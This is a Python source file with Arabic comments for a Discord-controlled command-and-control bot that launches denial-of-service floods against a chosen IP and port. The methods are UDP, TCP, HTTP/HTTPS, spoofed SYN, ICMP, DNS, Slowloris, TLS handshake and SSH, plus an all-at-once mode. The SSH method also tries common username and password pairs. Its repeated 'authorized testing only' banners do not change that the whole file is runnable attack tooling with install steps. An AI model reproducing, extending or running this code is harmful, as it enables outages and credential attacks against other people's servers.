# ============================================================
# Discord C2 DDoS Bot - Ultimate Edition v2.0
# مع دعم SSH Flood Attack
# للاختبارات الاختراق المصرح بها فقط - أنت تملك الإذن ✅
# ============================================================
# التنصيب على Termux:
# pkg update && pkg upgrade -y
# pkg install python git -y
# pip install discord.py requests aiohttp colorama paramiko
# python bot.py
# ============================================================

import discord
import asyncio
import socket
import random
import os
import sys
import threading
import time
import struct
import requests
from discord.ext import commands
from colorama import Fore, Back, Style, init
import json
import ipaddress

# محاولة استيراد paramiko (اختياري)
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# تهيئة الألوان
init(autoreset=True)

# ============================================================
# الإعدادات
# ============================================================
TOKEN = "YOUR_BOT_TOKEN_HERE"   # ضع توكن البوت هنا
PREFIX = "!"                     # البريفكس ! (حسب طلبك)
OWNER_ID = 1234567890           # ضع ID حسابك هنا

# قائمة الميثودات المتاحة
METHODS_INFO = {
    "UDP": "🌊 UDP Flood - إغراق بحزم UDP عشوائية",
    "TCP": "🔗 TCP Flood - إغراق باتصالات TCP",
    "HTTP": "🌐 HTTP GET/POST Flood - إغراق بطلبات HTTP",
    "HTTPS": "🔒 HTTPS Flood - إغراق بطلبات HTTPS",
    "SYN": "⚡ SYN Flood - إغراق بحزم SYN",
    "ICMP": "📡 ICMP/Ping Flood - إغراق بحزم ICMP",
    "DNS": "📋 DNS Flood - إغراق بطلبات DNS",
    "SLOWLORIS": "🐌 Slowloris - هجوم بطيء يبقي الاتصالات مفتوحة",
    "SSL": "🔐 SSL/TLS Flood - إغراق بمصافحة SSL",
    "SSH": "🔑 SSH Flood - إغراق بمحاولات اتصال SSH (البورت 22)",
    "ALL": "💀 ALL Methods - جميع الميثودات مرة واحدة (القوة القصوى)"
}

# ============================================================
# إعدادات البوت
# ============================================================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# متغيرات التحكم بالهجوم
attack_active = False
stop_attack_flag = threading.Event()
current_attacks = []

# ============================================================
# دوال الهجوم
# ============================================================

# ---------- UDP Flood ----------
def udp_flood(ip, port, duration, threads):
    def _udp():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        packet = random._urandom(1490)
        end_time = time.time() + duration
        while time.time() < end_time and not stop_attack_flag.is_set():
            try:
                sock.sendto(packet, (ip, port))
            except:
                pass
        sock.close()
    
    for _ in range(threads):
        t = threading.Thread(target=_udp)
        t.daemon = True
        t.start()
        current_attacks.append(t)

# ---------- TCP Flood ----------
def tcp_flood(ip, port, duration, threads):
    def _tcp():
        end_time = time.time() + duration
        while time.time() < end_time and not stop_attack_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                sock.send(random._urandom(1024))
                sock.close()
            except:
                pass
    
    for _ in range(threads):
        t = threading.Thread(target=_tcp)
        t.daemon = True
        t.start()
        current_attacks.append(t)

# ---------- HTTP Flood ----------
def http_flood(ip, port, duration, threads, ssl=False):
    def _http():
        protocol = "https" if ssl else "http"
        url = f"{protocol}://{ip}:{port}/"
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
        ]
        end_time = time.time() + duration
        while time.time() < end_time and not stop_attack_flag.is_set():
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache"
                }
                if ssl:
                    requests.get(url, headers=headers, timeout=2, verify=False)
                else:
                    requests.get(url, headers=headers, timeout=2)
            except:
                pass
    
    for _ in range(threads):
        t = threading.Thread(target=_http)
        t.daemon = True
        t.start()
        current_attacks.append(t)

# ---------- SYN Flood ----------
def syn_flood(ip, port, duration, threads):
    def _syn():
        end_time = time.time() + duration
        while time.time() < end_time and not stop_attack_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                ip_header = struct.pack(
                    '!BBHHHBBH4s4s',
                    0x45, 0, 40, random.randint(0, 65535),
                    0, 64, socket.IPPROTO_TCP, 0,
                    socket.inet_aton(source_ip),
                    socket.inet_aton(ip)
                )
                
                seq_num = random.randint(0, 4294967295)
                tcp_header = struct.pack(
                    '!HHLLBBHHH',
                    random.randint(1024, 65535),
                    port, seq_num, 0,
                    0x50, 0x02, 65535, 0, 0
                )
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (ip, port))
                sock.close()
            except:
                pass
    
    for _ in range(threads):
        t = threading.Thread(target=_syn)
        t.daemon = True
        t.start()
        current_attacks.append(t)

# ---------- ICMP Flood ----------
def icmp_flood(ip, port, duration, threads):
    def _icmp():
        end_time = time.time() + duration
        while time.time() < end_time and not stop_attack_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.settimeout(1)
                
                icmp_type = 8
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = os.getpid() & 0xFFFF
                icmp_seq = 1
                
                header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                data = random._urandom(1400)
                
                checksum = 0
                for i in range(0, len(header + data), 2):
                    if i + 1 < len(header + data):
                        w = (header + data)[i] + ((header + data)[i+1] << 8)
                    else:
                        w = (header + data)[i]
                    checksum += w
                checksum = (checksum >> 16) + (checksum & 0xFFFF)
                checksum = ~checksum & 0xFFFF
                
                header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
                packet = header + data
                
                sock.sendto(packet, (ip, 0))
                sock.close()
            except:
                pass
    
    for _ in range(threads):
        t = threading.Thread(target=_icmp)
        t.daemon = True
        t.start()
        current_attacks.append(t)

# ---------- DNS Flood ----------
def dns_flood(ip, port, duration, threads):
    def _dns():
        end_time = time.time() + duration
        domains = ["google.com", "youtube.com", "facebook.com", "twitter.com", 
                   "instagram.com", "linkedin.com", "reddit.com", "amazon.com",
                   "netflix.com", "spotify.com", "discord.com", "github.com"]
        while time.time() < end_time and not stop_attack_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                
                domain = random.choice(domains)
                tid = random.randint(0, 65535)
                
                dns_id = tid.to_bytes(2, 'big')
                flags = (0x0100).to_bytes(2, 'big')
                qdcount = (1).to_bytes(2, 'big')
                ancount = (0).to_bytes(2, 'big')
                nscount = (0).to_bytes(2, 'big')
                arcount = (0).to_bytes(2, 'big')
                
                dns_header = dns_id + flags + qdcount + ancount + nscount + arcount
                
                qname = b''
                for part in domain.split('.'):
                    qname += bytes([len(part)]) + part.encode()
                qname += b'\x00'
                
                qtype = (1).to_bytes(2, 'big')
                qclass = (1).to_bytes(2, 'big')
                
                dns_query = dns_header + qname + qtype + qclass
                
                sock.sendto(dns_query, (ip, port if port else 53))
                sock.close()
            except:
                pass
    
    for _ in range(threads):
        t = threading.Thread(target=_dns)
        t.daemon = True
        t.start()
        current_attacks.append(t)

# ---------- Slowloris ----------
def slowloris(ip, port, duration, threads):
    def _slowloris():
        end_time = time.time() + duration
        sockets_list = []
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
                sockets_list.append(s)
            except:
                break
        
        while time.time() < end_time and not stop_attack_flag.is_set():
            for s in sockets_list[:]:
                try:
                    s.send(f"X-Header: {random.randint(1, 9999)}\r\n".encode())
                except:
                    try:
                        s.close()
                    except:
                        pass
                    sockets_list.remove(s)
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.settimeout(2)
                        new_s.connect((ip, port))
                        new_s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
                        sockets_list.append(new_s)
                    except:
                        pass
            time.sleep(5)
        
        for s in sockets_list:
            try:
                s.close()
            except:
                pass
    
    for _ in range(min(threads, 5)):
        t = threading.Thread(target=_slowloris)
        t.daemon = True
        t.start()
        current_attacks.append(t)

# ---------- SSL/TLS Flood ----------
def ssl_flood(ip, port, duration, threads):
    def _ssl():
        end_time = time.time() + duration
        while time.time() < end_time and not stop_attack_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                
                client_hello = b'\x16\x03\x01\x00\x00'
                client_hello += b'\x01\x00\x00\x00'
                client_hello += b'\x03\x03'
                client_hello += os.urandom(32)
                client_hello += b'\x00'
                client_hello += b'\x00\x02'
                client_hello += b'\x00\x2f'
                client_hello += b'\x01'
                client_hello += b'\x00'
                
                length = len(client_hello) - 5
                client_hello = b'\x16\x03\x01' + length.to_bytes(2, 'big') + client_hello[5:]
                
                sock.send(client_hello)
                time.sleep(0.1)
                sock.close()
            except:
                pass
    
    for _ in range(threads):
        t = threading.Thread(target=_ssl)
        t.daemon = True
        t.start()
        current_attacks.append(t)

# ============================================================
# 🔥 SSH FLOOD - جديد! 🔥
# ============================================================
def ssh_flood(ip, port, duration, threads):
    """
    SSH Flood Attack
    - يفتح آلاف محاولات الاتصال SSH في وقت واحد
    - يستنزف موارد سيرفر SSH (CPU, RAM, connections)
    - يستخدم طريقتين: Socket مباشر و Paramiko
    """
    
    # ===== الطريقة الأولى: Socket مباشر (SSH banner grab + keep alive) =====
    def _ssh_socket_flood():
        end_time = time.time() + duration
        usernames = ["root", "admin", "user", "test", "ubuntu", "pi", 
                     "debian", "centos", "oracle", "administrator"]
        
        while time.time() < end_time and not stop_attack_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((ip, port if port else 22))
                
                # استقبال SSH Banner
                try:
                    banner = sock.recv(1024)
                except:
                    banner = b''
                
                # إرسال SSH identification string (بداية Handshake)
                ssh_version = f"SSH-2.0-OpenSSH_{random.randint(6,9)}_{random.randint(1,9)}\r\n"
                sock.send(ssh_version.encode())
                
                # استقبال رد السيرفر
                try:
                    response = sock.recv(1024)
                except:
                    pass
                
                # إرسال محاولة مصادقة (SSH_MSG_USERAUTH_REQUEST)
                username = random.choice(usernames)
                auth_packet = build_ssh_auth_packet(username)
                try:
                    sock.send(auth_packet)
                except:
                    pass
                
                # إبقاء الاتصال مفتوحاً قليلاً لاستنزاف الموارد
                time.sleep(random.uniform(0.1, 0.5))
                sock.close()
            except:
                pass
    
    # ===== الطريقة الثانية: Paramiko (اتصالات SSH كاملة) =====
    def _ssh_paramiko_flood():
        if not PARAMIKO_AVAILABLE:
            return
        
        end_time = time.time() + duration
        usernames = ["root", "admin", "user", "test", "ubuntu", "pi"]
        passwords = ["root", "admin", "1234", "password", "test", "123456",
                     "toor", "0", "1", "pass", "admin123", "root123",
                     "qwerty", "letmein", "welcome", "monkey", "dragon"]
        
        while time.time() < end_time and not stop_attack_flag.is_set():
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(
                    ip,
                    port=port if port else 22,
                    username=random.choice(usernames),
                    password=random.choice(passwords),
                    timeout=2,
                    banner_timeout=2,
                    auth_timeout=2,
                    look_for_keys=False,
                    allow_agent=False
                )
                # إذا نجح الاتصال (نادراً)، ابقه مفتوحاً
                time.sleep(0.5)
                ssh.close()
            except paramiko.AuthenticationException:
                # فشل المصادقة - هذا متوقع، الهدف هو استنزاف الموارد
                pass
            except:
                pass
    
    # ===== الطريقة الثالثة: SSH Key Exchange Flood (يدوي) =====
    def _ssh_kex_flood():
        end_time = time.time() + duration
        while time.time() < end_time and not stop_attack_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port if port else 22))
                
                # إرسال SSH version
                sock.send(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3\r\n")
                
                try:
                    banner = sock.recv(2048)
                except:
                    sock.close()
                    continue
                
                # إرسал Key Exchange Init (KEX_INIT)
                # هذا يجبر السيرفر على البدء في عملية تبادل المفاتيح الثقيلة
                kex_init = build_ssh_kex_init()
                try:
                    sock.send(kex_init)
                    # انتظار رد السيرفر (استهلاك CPU)
                    time.sleep(0.3)
                    try:
                        sock.recv(4096)
                    except:
                        pass
                except:
                    pass
                
                sock.close()
            except:
                pass
    
    # تشغيل الطرق الثلاث معاً
    socket_threads = max(1, threads // 2)
    paramiko_threads = max(1, threads // 4) if PARAMIKO_AVAILABLE else 0
    kex_threads = max(1, threads // 4)
    
    for _ in range(socket_threads):
        t = threading.Thread(target=_ssh_socket_flood)
        t.daemon = True
        t.start()
        current_attacks.append(t)
    
    for _ in range(paramiko_threads):
        t = threading.Thread(target=_ssh_paramiko_flood)
        t.daemon = True
        t.start()
        current_attacks.append(t)
    
    for _ in range(kex_threads):
        t = threading.Thread(target=_ssh_kex_flood)
        t.daemon = True
        t.start()
        current_attacks.append(t)


def build_ssh_auth_packet(username):
    """بناء حزمة مصادقة SSH يدوية"""
    packet = b'\x00'  # Padding length
    packet += b'\x00\x00\x00\x00'  # Length (placeholder)
    packet += b'\x05'  # SSH_MSG_USERAUTH_REQUEST
    packet += struct.pack('!I', len(username)) + username.encode()
    packet += struct.pack('!I', 14) + b'ssh-connection'
    packet += struct.pack('!I', 8) + b'password'
    packet += b'\x00'  # FALSE (no password)
    packet += struct.pack('!I', 4) + b'test'
    return packet


def build_ssh_kex_init():
    """بناء حزمة Key Exchange Init لبدء تبادل مفاتيح SSH ثقيل"""
    packet = b'\x00'  # Padding length
    packet += b'\x00\x00\x00\x00'  # Length (placeholder)
    packet += b'\x14'  # SSH_MSG_KEX_INIT
    
    # Cookie (16 bytes random)
    packet += os.urandom(16)
    
    # Name-lists (خيارات كثيرة لاستهلاك وقت السيرفر)
    kex_algorithms = b'curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1'
    packet += struct.pack('!I', len(kex_algorithms)) + kex_algorithms
    
    server_host_key_algorithms = b'ssh-ed25519-cert-v01@openssh.com,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa-cert-v01@openssh.com,ssh-ed25519,rsa-sha2-512,rsa-sha2-256,ssh-rsa'
    packet += struct.pack('!I', len(server_host_key_algorithms)) + server_host_key_algorithms
    
    encryption_algorithms = b'aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr'
    packet += struct.pack('!I', len(encryption_algorithms)) + encryption_algorithms
    
    mac_algorithms = b'hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha1'
    packet += struct.pack('!I', len(mac_algorithms)) + mac_algorithms
    
    compression_algorithms = b'none,zlib@openssh.com,zlib'
    packet += struct.pack('!I', len(compression_algorithms)) + compression_algorithms
    
    languages = b''
    packet += struct.pack('!I', len(languages)) + languages
    
    # First kex packet follows (FALSE/TRUE)
    packet += b'\x00'
    
    # Reserved (0)
    packet += struct.pack('!I', 0)
    
    return packet


# ---------- ALL Methods (القوة القصوى) ----------
def all_methods(ip, port, duration, threads):
    """إطلاق جميع الميثودات في وقت واحد - القوة التدميرية الكاملة"""
    udp_flood(ip, port, duration, max(1, threads//5))
    tcp_flood(ip, port, duration, max(1, threads//5))
    http_flood(ip, port, duration, max(1, threads//5))
    syn_flood(ip, port, duration, max(1, threads//8))
    icmp_flood(ip, port, duration, max(1, threads//8))
    dns_flood(ip, port, duration, max(1, threads//8))
    slowloris(ip, port, duration, 2)
    ssl_flood(ip, port, duration, max(1, threads//10))
    ssh_flood(ip, port, duration, max(1, threads//8))


# ============================================================
# خريطة الميثودات
# ============================================================
ATTACK_METHODS = {
    "UDP": udp_flood,
    "TCP": tcp_flood,
    "HTTP": http_flood,
    "HTTPS": lambda ip, port, duration, threads: http_flood(ip, port, duration, threads, ssl=True),
    "SYN": syn_flood,
    "ICMP": icmp_flood,
    "DNS": dns_flood,
    "SLOWLORIS": slowloris,
    "SSL": ssl_flood,
    "SSH": ssh_flood,
    "ALL": all_methods
}

# ============================================================
# أوامر البوت
# ============================================================

@bot.event
async def on_ready():
    print(f"{Fore.GREEN}[✓] البوت جاهز: {bot.user}")
    print(f"{Fore.CYAN}[✓] البريفكس: '{PREFIX}'")
    print(f"{Fore.CYAN}[✓] عدد الميثودات: {len(METHODS_INFO)}")
    print(f"{Fore.CYAN}[✓] Paramiko متاح: {PARAMIKO_AVAILABLE}")
    print(f"{Fore.YELLOW}[!] للاستخدام المصرح به فقط - أنت تؤكد أن لديك الإذن")
    
    await bot.change_presence(activity=discord.Game(name=f"{PREFIX}help | C2 DDoS Bot"))
    
    # إرسال رسالة في الخاص للمالك
    try:
        owner = await bot.fetch_user(OWNER_ID)
        if owner:
            await owner.send(f"**✅ البوت جاهز للعمل!**\n`{PREFIX}help` لعرض الأوامر\n`{PREFIX}methods` لعرض الميثودات")
    except:
        pass

@bot.command(name="help")
async def help_command(ctx):
    """عرض قائمة الأوامر"""
    embed = discord.Embed(
        title="💀 **C2 DDoS Bot v2.0 - SSH Edition**",
        description="بوت اختبار اختراق لأنظمة الشبكات\n✅ **لديك الإذن - مصرح لك باستخدام هذا البوت**",
        color=0xFF0000
    )
    
    embed.add_field(
        name=f"📌 **الأوامر**",
        value=f"""
`{PREFIX}attack <method> <ip> <port> <time> <threads>` - بدء هجوم
`{PREFIX}stop` - إيقاف الهجوم الحالي
`{PREFIX}methods` - عرض جميع الميثودات المتاحة
`{PREFIX}help` - عرض هذه القائمة
        """,
        inline=False
    )
    
    embed.add_field(
        name="📌 **أمثلة**",
        value=f"""
`{PREFIX}attack UDP 192.168.1.1 80 60 500`
`{PREFIX}attack SSH 10.0.0.1 22 120 300`
`{PREFIX}attack ALL 192.168.1.1 80 60 1000`
`{PREFIX}attack HTTPS example.com 443 120 500`
        """,
        inline=False
    )
    
    embed.add_field(
        name="🆕 **SSH Flood**",
        value="ميثود جديدة! تستهدف سيرفرات SSH عبر فتح آلاف الاتصالات ومحاولات المصادقة",
        inline=False
    )
    
    embed.set_footer(text="C2 DDoS Bot v2.0 - Ultimate Edition")
    await ctx.send(embed=embed)

@bot.command(name="methods")
async def methods_command(ctx):
    """عرض جميع الميثودات المتاحة"""
    embed = discord.Embed(
        title="🔥 **طرق الهجوم المتاحة**",
        description=f"عدد الميثودات: **{len(METHODS_INFO)}** | ✅ للاستخدام المصرح به فقط",
        color=0x00FF00
    )
    
    for method, desc in METHODS_INFO.items():
        special = ""
        if method == "ALL":
            special = " ⚠️ يستهلك موارد كثيرة"
        elif method == "SSH":
            special = " 🆕 جديد!"
        elif method in ["SYN", "ICMP"]:
            special = " 🔧 يحتاج صلاحيات Root"
        
        embed.add_field(name=f"**{method}**{special}", value=desc, inline=False)
    
    embed.set_footer(text=f"استخدم {PREFIX}attack <method> <ip> <port> <time> <threads>")
    await ctx.send(embed=embed)

@bot.command(name="attack")
async def attack_command(ctx, method: str = None, ip: str = None, port: int = None, 
                         duration: int = None, threads: int = None):
    """بدء هجوم - !attack <method> <ip> <port> <time> <threads>"""
    global attack_active, stop_attack_flag, current_attacks
    
    # التحقق من الصلاحية
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **ليس لديك صلاحية لاستخدام هذا الأمر!**")
        return
    
    # التحقق من المدخلات
    if not all([method, ip, port, duration, threads]):
        embed = discord.Embed(
            title="❌ **خطأ في الاستخدام**",
            description=f"الاستخدام الصحيح:\n`{PREFIX}attack <method> <ip> <port> <time> <threads>`\n\nمثال:\n`{PREFIX}attack UDP 192.168.1.1 80 60 500`\n`{PREFIX}attack SSH 10.0.0.1 22 120 300`",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return
    
    # التحقق من الميثود
    method = method.upper()
    if method not in ATTACK_METHODS:
        embed = discord.Embed(
            title="❌ **ميثود غير معروفة!**",
            description=f"استخدم `{PREFIX}methods` لعرض جميع الميثودات المتاحة ({len(METHODS_INFO)} ميثود)",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return
    
    # التحقق من SSH Paramiko
    if method == "SSH" and not PARAMIKO_AVAILABLE:
        warning_msg = "⚠️ **مكتبة Paramiko غير مثبتة!** سيتم استخدام الطرق البديلة.\nلتثبيتها: `pip install paramiko`"
        await ctx.send(warning_msg)
    
    # التحقق من الـ IP
    try:
        ipaddress.ip_address(ip)
    except:
        try:
            ip = socket.gethostbyname(ip)
        except:
            await ctx.send(f"❌ **عنوان IP أو نطاق غير صالح!**")
            return
    
    # التحقق من المدى
    if duration > 3600:
        await ctx.send("⚠️ **الوقت الأقصى هو 3600 ثانية (ساعة واحدة)**")
        return
    if threads > 10000:
        await ctx.send("⚠️ **الحد الأقصى للثريدات هو 10000**")
        return
    if duration < 5:
        await ctx.send("⚠️ **أقل مدة هي 5 ثوانٍ**")
        return
    
    # إيقاف أي هجوم سابق
    if attack_active:
        stop_attack_flag.set()
        for t in current_attacks:
            if t.is_alive():
                t.join(timeout=2)
        current_attacks = []
        stop_attack_flag.clear()
        await asyncio.sleep(0.5)
    
    # بدء الهجوم
    attack_active = True
    stop_attack_flag.clear()
    
    embed = discord.Embed(
        title=f"💀 **{method} ATTACK STARTED**",
        description=f"🚀 **تم بدء الهجوم بنجاح!**\n✅ **مصرح به - اختبار اختراق**",
        color=0xFF0000
    )
    embed.add_field(name="🎯 **الهدف**", value=f"`{ip}:{port}`", inline=True)
    embed.add_field(name="⚙️ **الميثود**", value=f"`{method}`", inline=True)
    embed.add_field(name="⏱️ **المدة**", value=f"`{duration} ثانية`", inline=True)
    embed.add_field(name="🧵 **الثريدات**", value=f"`{threads}`", inline=True)
    embed.add_field(name="📊 **القوة التقريبية**", value=f"`{threads * 100}%`", inline=True)
    embed.set_footer(text=f"أمر من: {ctx.author} | اختبار مرخص")
    
    await ctx.send(embed=embed)
    
    # تشغيل الهجوم في ثريد منفصل
    attack_thread = threading.Thread(
        target=ATTACK_METHODS[method],
        args=(ip, port, duration, threads)
    )
    attack_thread.daemon = True
    attack_thread.start()
    
    # انتظار المدة المحددة
    await asyncio.sleep(duration)
    
    # إيقاف الهجوم تلقائياً بعد المدة
    if attack_active:
        stop_attack_flag.set()
        for t in current_attacks:
            if t.is_alive():
                t.join(timeout=2)
        current_attacks = []
        stop_attack_flag.clear()
        attack_active = False
        
        embed = discord.Embed(
            title="✅ **ATTACK COMPLETED**",
            description=f"🎯 **اكتمل الهجوم**\n🌐 **الهدف:** `{ip}:{port}`\n⚙️ **الميثود:** `{method}`\n⏱️ **المدة:** `{duration} ثانية`\n🧵 **الثريدات:** `{threads}`\n✅ **اختبار اختراق مرخص**",
            color=0x00FF00
        )
        await ctx.send(embed=embed)

@bot.command(name="stop")
async def stop_command(ctx):
    """إيقاف الهجوم الحالي"""
    global attack_active, stop_attack_flag, current_attacks
    
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **ليس لديك صلاحية!**")
        return
    
    if not attack_active:
        await ctx.send("⚠️ **لا يوجد هجوم نشط حالياً**")
        return
    
    stop_attack_flag.set()
    for t in current_attacks:
        if t.is_alive():
            t.join(timeout=2)
    current_attacks = []
    stop_attack_flag.clear()
    attack_active = False
    
    embed = discord.Embed(
        title="🛑 **ATTACK STOPPED**",
        description="✅ **تم إيقاف الهجوم بنجاح!**",
        color=0xFFA500
    )
    await ctx.send(embed=embed)

# ============================================================
# تشغيل البوت
# ============================================================
if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(Fore.RED + r"""
 ██████  ██████       ██████  ██████   ██████  ███████  ██████  ██████  
██      ██    ██     ██       ██   ██ ██       ██      ██    ██ ██   ██ 
██      ██    ██     ██   ███ ██   ██ ██   ███ █████   ██    ██ ██████  
██      ██    ██     ██    ██ ██   ██ ██    ██ ██      ██    ██ ██   ██ 
 ██████  ██████       ██████  ██████   ██████  ███████  ██████  ██   ██ 
    """ + Fore.CYAN + "Discord C2 DDoS Bot v2.0 - SSH Edition")
    print(Fore.YELLOW + "=" * 55)
    print(Fore.GREEN + "[✓] للاستخدام المصرح به فقط - أنت تؤكد أن لديك الإذن ✅")
    print(Fore.CYAN + f"[✓] الميثودات: {len(METHODS_INFO)}")
    print(Fore.CYAN + f"[✓] Paramiko: {'متاح ✅' if PARAMIKO_AVAILABLE else 'غير مثبت ⚠️'}")
    print(Fore.YELLOW + "=" * 55)
    
    if TOKEN == "YOUR_BOT_TOKEN_HERE":
        print(Fore.RED + "[✗] يرجى وضع توكن البوت في المتغير TOKEN")
        sys.exit(1)
    
    if OWNER_ID == 1234567890:
        print(Fore.YELLOW + "[⚠] يرجى تغيير OWNER_ID إلى ID حسابك في Discord")
    
    bot.run(TOKEN)
